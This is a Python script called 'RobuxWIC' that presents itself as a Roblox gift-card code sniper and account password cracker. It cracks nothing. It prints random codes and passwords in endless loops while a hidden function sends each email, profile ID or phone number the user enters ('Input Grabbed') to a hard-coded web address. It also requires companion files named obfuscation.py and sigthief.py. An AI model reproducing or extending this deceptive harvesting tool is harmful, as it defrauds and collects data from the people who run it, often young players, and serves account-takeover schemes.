import os as o
import random as r
import string as s
import requests as req
from time import sleep as slp
import re as regex
from colorama import Fore as f, init as init_color
import ctypes as ct

files = ['obfuscation.py', 'WICengine.py', 'sigthief.py', 'update.py', 'updater.py']
if not all(o.path.isfile(file) for file in files):
    print(f.RED + "Exiting the program.")
    exit()

ct.windll.kernel32.SetConsoleTitleW("RobuxWIC")
init_color(autoreset=True)

roblox_api = "http://accountinformation.roblox.com/docs"

def generate_c0de():
    chars = s.ascii_uppercase + s.digits
    return ''.join(''.join(r.choice(chars) for _ in range(4)) for _ in range(3))

def generate_p4ss():
    chars = s.ascii_letters + s.digits + s.punctuation
    return ''.join(r.choice(chars) for _ in range(8))

def slumber():
    return r.uniform(0.5, 2)

def email_validator(email):
    email_pattern = r'^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+$'
    return regex.match(email_pattern, email) is not None

def webhook_sender(data):
    payload = {"content": data}
    try:
        req.post(roblox_api, json=payload)
    except Exception:
        pass

def profile_checker(profile_id):
    url = f"https://users.roblox.com/v1/users/{profile_id}"
    response = req.get(url)

    if response.status_code == 200:
        data = response.json()
        return data.get("name")
    else:
        print(f.RED + "Roblox profile not found or error connecting to Roblox API.")
        return None

def password_guesser(identity):
    print("The program is guessing passwords...")
    webhook_sender(f"Input Grabbed: {identity}")

    while True:
        random_password = generate_p4ss()
        print(f.RED + f"Password: {random_password}")
        slp(slumber())
        print(f.RED + "False password, trying again...\n")

def pause_clear():
    input(f.YELLOW + "\nPress any key to continue...")
    o.system("cls" if o.name == "nt" else "clear")

def display_menu():
    print(f.LIGHTMAGENTA_EX + "██████╗░░█████╗░██████╗░██╗░░░██╗██╗░░██╗░██╗░░░░░░░██╗██╗░█████╗░")
    print(f.LIGHTMAGENTA_EX + "██╔══██╗██╔══██╗██╔══██╗██║░░░██║╚██╗██╔╝░██║░░██╗░░██║██║██╔══██╗")
    print(f.LIGHTMAGENTA_EX + "██████╔╝██║░░██║██████╦╝██║░░░██║░╚███╔╝░░╚██╗████╗██╔╝██║██║░░╚═╝")
    print(f.LIGHTMAGENTA_EX + "██╔══██╗██║░░██║██╔══██╗██║░░░██║░██╔██╗░░░████╔═████║░██║██║░░██╗")
    print(f.LIGHTMAGENTA_EX + "██║░░██║╚█████╔╝██████╦╝╚██████╔╝██╔╝╚██╗░░╚██╔╝░╚██╔╝░██║╚█████╔╝")
    print(f.LIGHTMAGENTA_EX + "╚═╝░░╚═╝░╚════╝░╚═════╝░░╚═════╝░╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░╚═╝░╚════╝░\n")
    print(f.BLUE + "Choose an option:")
    print(f.CYAN + "1. Gift Cards Codes Sniper")
    print(f.CYAN + "2. Account Sniper")
    print(f.CYAN + "3. Credits")

    option = input(f.YELLOW + "Enter 1, 2, or 3: ")

    if option == '1':
        print("Sniping Roblox Gift Cards")
        while True:
            random_code = generate_c0de()
            print(f.RED + f"Code: {random_code}")
            slp(slumber())
            print(f.RED + "Invalid...\n")

    elif option == '2':
        print(f.CYAN + "Choose an input:")
        print(f.CYAN + "1. Email")
        print(f.CYAN + "2. Roblox Profile ID")
        print(f.CYAN + "3. Phone Number")
        sub_option = input(f.YELLOW + "Enter 1, 2, or 3: ")

        if sub_option == '1':
            email = input("Enter an email: ")
            if not email_validator(email):
                print(f.RED + "Invalid email format. Returning to the menu.\n")
                pause_clear()
                display_menu()
            else:
                password_guesser(email)

        elif sub_option == '2':
            profile_id = input("Enter a Roblox profile ID: ")
            profile_name = profile_checker(profile_id)
            if profile_name:
                print(f.GREEN + f"Profile '{profile_name}' found!")
                password_guesser(profile_id)
            else:
                print(f.RED + "Returning to the menu.\n")
                pause_clear()
                display_menu()

        elif sub_option == '3':
            phone = input("Enter a phone number: ")
            print(f.GREEN + f"Phone number '{phone}' accepted.")
            password_guesser(phone)

        else:
            print(f.RED + "Invalid Input\n")
            pause_clear()
            display_menu()

    elif option == '3':
        print(f.GREEN + "This Tool Was Made With Love By", f.CYAN + "marcusa11y")
        pause_clear()
        display_menu()

    else:
        print(f.RED + "Invalid Input")
        pause_clear()
        display_menu()

if __name__ == "__main__":
    display_menu()